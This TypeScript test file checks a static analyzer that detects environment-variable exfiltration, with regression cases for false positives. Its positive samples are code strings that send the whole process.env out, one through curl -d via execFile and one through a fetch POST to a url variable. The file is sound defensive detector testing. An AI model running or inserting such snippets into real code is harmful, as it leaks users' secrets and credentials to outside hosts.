import { describe, it, expect } from 'vitest';
import { analyzeCode } from './ast-analyzer.js';

const exfil = (code: string, file: string) =>
  analyzeCode(code, file).filter(f => f.type === 'source-to-sink' && f.sourceKind === 'env');

describe('env flows (dt14 regressions)', () => {
  it('an options object passed to execFile before a callback is not argv', () => {
    const code = "const { execFile } = require('child_process');\nexecFile('git', ['status'], { env: process.env }, () => {});\n";
    expect(exfil(code, 'opts-cb.js')).toEqual([]);
    // the environment in a network program's argv still is
    const bad = "const { execFile } = require('child_process');\nexecFile('curl', ['-d', JSON.stringify(process.env), url], () => {});\n";
    expect(exfil(bad, 'curl-cb.js').length).toBeGreaterThan(0);
  });

  it('a whole-env copy is tracked by binding, not by a reused name', () => {
    const code = [
      'function a() { const t = { ...process.env }; return Object.keys(t).length; }',
      'function b(t) { return fetch(url, { method: "POST", body: t }); }',
    ].join('\n');
    expect(exfil(code, 'minified.js').filter(f => f.wholeEnv)).toEqual([]);
    const bad = 'function c() { const t = { ...process.env }; return fetch(url, { method: "POST", body: JSON.stringify(t) }); }';
    expect(exfil(bad, 'real.js').some(f => f.wholeEnv)).toBe(true);
  });
});
